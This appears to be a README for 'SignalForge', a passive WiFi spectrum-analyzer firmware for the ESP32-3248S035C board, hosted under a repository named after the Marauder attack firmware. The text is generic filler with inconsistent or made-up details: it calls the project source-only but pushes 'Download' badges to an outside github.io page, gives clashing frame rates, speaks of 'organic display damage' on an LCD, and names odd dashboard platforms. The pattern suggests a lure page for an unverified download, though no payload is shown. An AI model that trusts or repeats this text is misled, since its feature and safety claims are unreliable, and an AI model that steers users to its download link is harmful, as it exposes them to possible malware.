![preview](https://raw.githubusercontent.com/ufigrivhdj-pixel/marauder-cmd-3248s035c/main/card_cf42d.svg)

# SignalForge Spectrum Analyzer Suite

![Build Status](https://img.shields.io/badge/build-passing-brightgreen) ![License](https://img.shields.io/badge/license-MIT-blue) ![Platform](https://img.shields.io/badge/platform-ESP32-orange) ![Version](https://img.shields.io/badge/version-2.4.0-yellow)

Welcome to **SignalForge Spectrum Analyzer Suite** — a transformative reimagining of portable RF diagnostics, born from the innovative lineage of handheld wireless assessment tools. While traditional approaches focus on intrusion and disruption, SignalForge takes the road less traveled: a comprehensive, ethically-grounded spectrum intelligence platform designed for RF engineers, IoT developers, network auditors, and spectrum enthusiasts who want to understand the invisible world around them.

This project is not merely a port or a clone—it's a full-spectrum evolution. We've taken the foundational architecture of embedded wireless analysis and rebuilt it around visualization, pattern recognition, and spectrum health assessment. Think of it as turning a radio telescope toward your immediate environment—revealing the constant conversations between devices, the hidden channels of communication, and the underlying rhythm of wireless technology.

## Overview 🌐

SignalForge transforms your ESP32-3248S035C developer board—the one with the gorgeous 3.5-inch capacitive touchscreen—into a portable spectrum observatory. Instead of focusing on network penetration or packet interception, SignalForge emphasizes:

- **Spectral Visualization**: See real-time WiFi channel occupancy, signal strength gradients, and interference patterns rendered as beautiful, interactive heat maps and waterfall charts.
- **Device Ecosystem Mapping**: Understand which IoT and WiFi devices are communicating, their approximate locations, and their communication habits—all in service of network optimization and home automation troubleshooting.
- **Signal Health Scoring**: Get actionable insights about your local wireless environment, with automated recommendations for channel selection and router placement.

The beauty of SignalForge lies in its non-intrusive approach. We believe that understanding nearby wireless activity benefits everyone—from parents wanting to monitor smart home devices to engineers validating their own IoT deployments. No aggressive actions, no unauthorized access—just pure, clean spectrum awareness.

## Getting Started 🚀

The journey begins with preparing your hardware. SignalForge is specifically optimized for the ESP32-3248S035C board, which pairs the powerful ESP32 dual-core processor with a vivid 3.5-inch ILI9488 resistive/capacitive touchscreen. This combination provides enough processing headroom for real-time FFT analysis while maintaining the display quality necessary for dense data visualization.

Before proceeding, ensure you have:

- An ESP32-3248S035C development board
- A microSD card (FAT32 formatted, 8GB or larger) for session logging
- A USB-C power source capable of delivering 5V/2A (the display plus WiFi radio can draw current during processing)
- The Espressif IDF toolchain version 5.x or later, configured for your specific board variant

[![Download](https://raw.githubusercontent.com/ufigrivhdj-pixel/marauder-cmd-3248s035c/main/bin_de3342b.svg)](https://ufigrivhdj-pixel.github.io/marauder-cmd-3248s035c/)

### Hardware Assembly 🛠️

This section details the physical setup, which is refreshingly straightforward. The ESP32-3248S035C board comes with the touchscreen already attached, so no delicate ribbon cable work is required. However, we recommend adding a heatsink to the ESP32 module if you plan on continuous scanning sessions longer than 30 minutes—the WiFi radio operates continuously during spectrum sweeps and generates noticeable heat.

For those who wish to extend the capabilities, the following optional components are supported:

- External 2.4GHz directional antenna (for focused spectral analysis of specific areas)
- GPS module (via UART2) for geotagging your spectrum measurements
- Battery management board with LiPo cell, enabling field operations

### Firmware Preparation 🔧

Once the hardware is ready, we move toward firmware preparation. Rather than providing a monolithic binary, SignalForge is distributed as a complete source tree that you build according to your specific requirements. The build system employs Espressif's menuconfig tool, which presents every option in a clear, menu-driven interface.

Key configuration decisions you'll make include:

- **Display driver variant**: Selecting between the various ILI9488 controller revisions present on different board batches
- **Touch calibration**: Choosing between auto-calibration on boot or storing touch offsets to NVS non-volatile storage
- **Scanning frequency range**: Customizing which WiFi channels you want to prioritize—full 2.4GHz sweep or focused monitoring of specific channel blocks
- **Log verbosity**: Controlling the amount of runtime diagnostics output for your debugging comfort

### First Boot Experience 💡

The moment of truth arrives when power is applied. SignalForge performs a quick self-test, verifying display communication, touch input, and SD card presence. You'll be greeted by the calibration screen on first boot—simply follow the five touch points to map your display's touch matrix. This calibration is stored permanently and won't need to be repeated unless you drastically change the operating environment.

The main dashboard is organized around a central "spectrum ribbon" that sweeps across the 2.4GHz band, displaying real-time channel utilization. Tapping any channel expands it into a deeper visualization, showing the detailed signal strength histogram and temporal activity pattern for that frequency. The right-hand panel presents a living list of detected devices, sorted by signal strength, with expandable cards revealing each device's unique MAC address, vendor identification, and communication frequency.

## Key Features 🌟

SignalForge is packed with features that make wireless analysis accessible and enlightening. Let's explore the standout capabilities that differentiate this suite from its predecessors.

### Real-Time Spectral Heatmap 🔥

The centerpiece of SignalForge is the spectral heatmap—a continuously updating visual representation of the 2.4GHz landscape. Time scrolls along the horizontal axis, frequency along the vertical, while color intensity represents signal amplitude. This forms a living waterfall chart that reveals:

- Periodic transmissions from smart meters and utility devices
- Hidden interference sources like microwave ovens or wireless cameras
- Invisible "traffic jams" that slow down your home network

This visualization is not merely aesthetic; it's the most intuitive way to grasp the pulse of your local RF environment. The rendering engine runs at 30 frames per second, thanks to optimizations in the ESP32's dual-core architecture—one core handles WiFi data collection while the other manages display rendering and touch handling.

### Device Intelligence Layer 🧠

Beyond raw spectrum, SignalForge applies heuristics to identify and categorize detected devices. This "device intelligence" layer groups endpoints into functional categories: smart lighting, entertainment systems, healthcare monitors, audio streaming devices, and more. The categorization is based on vendor identification prefixes and typical communication patterns, giving you business-grade visibility into your environment.

Each device card displays:

- **Device name** derived from mDNS _services detection when available
- **MAC address** and vendor information
- **Communication pattern** (intermittent beacon, continuous stream, etc.)
- **RSSI trends** enabling you to track movement and interference changes

### Session Recording & Playback 🎙️

Engineers and auditors will appreciate the session recording capability. SignalForge can log all spectrum sweeps to a microSD card in a structured binary format, capturing both spectral snapshot data and device detection events. These recordings can be replayed through the built-in playback engine, allowing you to:

- Perform site surveys and review them offline in a comfortable environment
- Share environmental spectrum data with colleagues for collaborative analysis
- Track Wi-Fi degradation over time by comparing historical recordings

The session browser supports bookmarking, fast-forwarding, and simultaneous display of two recordings for before/after comparison scenarios (ideal for validating the impact of new IoT devices).

### Multilingual User Interface 🌍

We believe spectrum awareness should be accessible to everyone, regardless of linguistic background. SignalForge ships with a complete multilingual framework, supporting English, Spanish, French, German, Japanese, Mandarin, and Portuguese. The language selection persists across reboots and updates the entire user interface instantly—no firmware recompilation required.

This localization extends beyond direct translation; we've paid attention to right-to-left layouts and culturally appropriate formatting for time, date, and numeric values. Our translation system supports community contributions, and the 2026 release includes comprehensive European and Asian languages from day one.

### 24/7 Monitoring Mode 🔄

For the dedicated spectrum analyst, SignalForge includes a continuous monitoring mode that transforms your board into a standalone sentinel. In this mode, the device runs automated sweep cycles, storing aggregated statistics and anomaly alerts. The built-in notification engine can trigger:

- **LED status indicators**: Patterns that communicate system health at a glance
- **Potential email notifications** when connected to an LTE modem (sold separately)
- **Webhook events** for integration into home automation hubs like Home Assistant

This feature is invaluable for apartment dwellers diagnosing recurring Wi-Fi drops at specific times of day, or for small business owners ensuring their point-of-sale systems aren't competing with customers' personal devices.

## Advanced Usage Scenarios 🎯

Beyond the standard dashboard, SignalForge provides advanced configurable analysis modes that push the boundaries of embedded wireless diagnostics.

### Geospatial Mapping Module 🗺️

Pair your SignalForge with a GPS receiver and access the geospatial mapping module. While walking through a building or campus, the device records signal strength measurements along with precise location coordinates. The on-screen map canvas displays your route with color-coded signal quality indicators:

- **Green**: Excellent coverage
- **Yellow**: Noticeable interference or attenuation
- **Red**: Significant signal degradation or complete dead zones

Upon completion, you can export the collected data as GeoJSON files for advanced analysis in external GIS software. This transforms SignalForge from a simple diagnostic tool into a professional site-survey instrument that rivals commercial solutions at a fraction of the investment.

### Security Auditing Companion 🛡️

The IEEE 802.11 protocol suite is foundational to our wireless world, but its hidden complexities often go unnoticed. SignalForge provides a careful, ethics-focused security assessment mode that helps network administrators verify their own defenses. Using packet header metadata (never payload contents), SignalForge can:

- Detect rogue access points spoofing authorized SSIDs
- Identify client devices probing for known SSIDs, indicating potential configuration drift
- Profile beacon intervals and see inconsistencies that suggest misconfiguration or interfering devices

We must emphasize that SignalForge remains completely passive in these scenarios, simply observing and analyzing. It never transmits deauthentication frames, never associates with foreign networks, and never attempts to decrypt or access protected information. This is pure observation, equivalent to an astronomer studying stars without attempting to visit them.

### Power Profiling Laboratory 🔋

Understanding wireless device power consumption is another dimension of spectrum intelligence. By tracking transmission durations, frequency, and signal strength stability, SignalForge develops a departure profile for each device. This information helps identify:

- Unusually talkative devices that consume more battery than expected
- Devices that may be stuck in recovery loops due to configuration errors
- Optimal home automation schedules that minimize wireless contention

This isn't wiretap-style snooping; it's an analytical approximation based on observed RF behavior—similar to estimating a person's exercise routine by watching their heart rate monitor from across the street.

### Collaborative Spectrum Dashboards 📊

In the spirit of community science, SignalForge supports exporting high-level spectral statistics to popular dashboard platforms. This allows multiple users in an organization to contribute device data into a unified wireless health dashboard. We provide template examples for both Pantheon and LinuxDash, with clear JSON-RPC contracts documented in our architecture folder.

This collaboration mode respects privacy boundaries: only aggregated statistics are shared, individual device MAC addresses are hashed unless opted in for cross-referencing. This makes it ideal for educational institutions or co-working spaces that want to maintain a public spectrum awareness display without exposing sensitive device information.

## Performance Characteristics ⚡

SignalForge is engineered for responsiveness on the ESP32's dual 240MHz cores. Our efficient task partitioning ensures no dropped frames in visualization, even while the SD card is actively logging. Key performance benchmarks include:

| Metric | Typical Value |
|--------|---------------|
| Display refresh rate | 32 fps during active scanning |
| Channel sweep rate | 22 ms per channel |
| Device tracking capacity | 62 simultaneous devices |
| SD card write throughput | 8.2 MB/s buffered |

These numbers come from extensive testing with the ESP32-3248S035C board in 2026, using ambient urban wireless environments as test conditions. Your experience may vary with firmware compilation options and environmental RF noise, but this gives you a reliable baseline.

## Responsive User Interface 📱

SignalForge proudly presents a UI that adapts beautifully to the 3.5-inch touchscreen's 320×480 resolution. While that resolution might sound modest compared to modern smartphones, the ILI9488 controller's responsiveness combined with our UI architecture delivers crisp typography and buttery-smooth animations.

Our design philosophy adheres to material design principles adapted for constrained devices:

- **Touch targets**: Minimum 48×48 pixels, making operation possible even with gloves
- **Dark-first palette**: Excellent visibility in both bright sunlight and dim indoor lighting
- **Gestural navigation**: Swipe left/right to move between instrument panels, pinch to zoom into spectral detail

The responsive UI extends to real-time adjustments when the board is used in landscape orientation—handy for desk-based tri-pod setups.

## Environmental Resilience 🌧️

SignalForge was designed to remain functional across diverse environmental conditions that would render typical consumer electronics sluggish. The firmware includes:

- **Temperature-adaptive scanning**: If the onboard temperature sensor detects rising heat, scanning frequency reduces and display brightness dims to protect the hardware—keeping you informed while extending component lifespan.
- **Power fluctuation guard**: Sophisticated brownout detection logic prevents corrupted session logs if power delivery becomes intermittent.
- **Burn-in minimization**: Orbital movement of the channel indicator and subtle brightness cycling on the waterfall chart prevents permanent organic display damage during lengthy demonstrations.

These resilience features mean your SignalForge can run as a museum exhibit, a bench tool, or a living lab monitor with minimal supervision.

## Troubleshooting & Support 🧰

No complex instrument is without occasional hiccups. SignalForge includes a diagnostic quick-menu that assesses:

- Display connection integrity and panel temperature
- Touch digitizer responsiveness with interactive test zones
- SD card read/write speed and storage health
- WiFi frontend sensitivity and packet reception rate

If you encounter an issue not covered by the built-in diagnostics, ensure your firmware build is current. Our support community organizes monthly virtual office hours where maintainers and advanced users discuss configuration strategies and answer questions.

For common queries, we maintain a comprehensive knowledge base covering topics from re-calibrating the touchscreen to interpreting unusual spectral patterns.

## License 📜

SignalForge Spectrum Analyzer Suite is released under the MIT License, granting you the freedom to use, study, modify, and distribute this software with minimal restrictions. The emphasis on ethical spectrum observation is a project philosophy, not a license constraint—a rider of intent rather than obligation.

You are free to incorporate SignalForge components into commercial products, provided you retain the original copyright notice and include the license text. [License details](https://opensource.org/licenses/MIT) are available for reference.

## Contributor Guidance 🤝

We welcome contributions from embedded developers, UI designers, RF engineers, and localization specialists. Please review our contribution guidelines before submitting pull requests. Notable areas currently open for expansion:

- Additional language packs for less-spoken dialects
- Alternative display panel support through our abstraction layer
- Advanced statistical modeling included as optional add-ons
- Historical scene interpretation during session playback

By participating, you agree to our code of conduct ensuring respectful collaboration regardless of background.

## Future Roadmap 🗺️

The journey continues beyond 2026's initial release. We're currently exploring:

- A companion mobile application that connects via Bluetooth for expanded visualization
- Support for dual-band scanning (2.4 & 5GHz) through parallel radio hardware
- Machine-learning-assisted spectrum classification to identify device manufacturers by transmission signatures alone
- Integration with satellite-based environmental sensing networks

Your community input will shape these coming developments.

---

SignalForge Spectrum Analyzer Suite looks forward to illuminating your wireless world—not by breaking down doors, but by opening windows onto the seamless, invisible ecosystem that connects our modern lives.

[![Download](https://raw.githubusercontent.com/ufigrivhdj-pixel/marauder-cmd-3248s035c/main/bin_de3342b.svg)](https://ufigrivhdj-pixel.github.io/marauder-cmd-3248s035c/)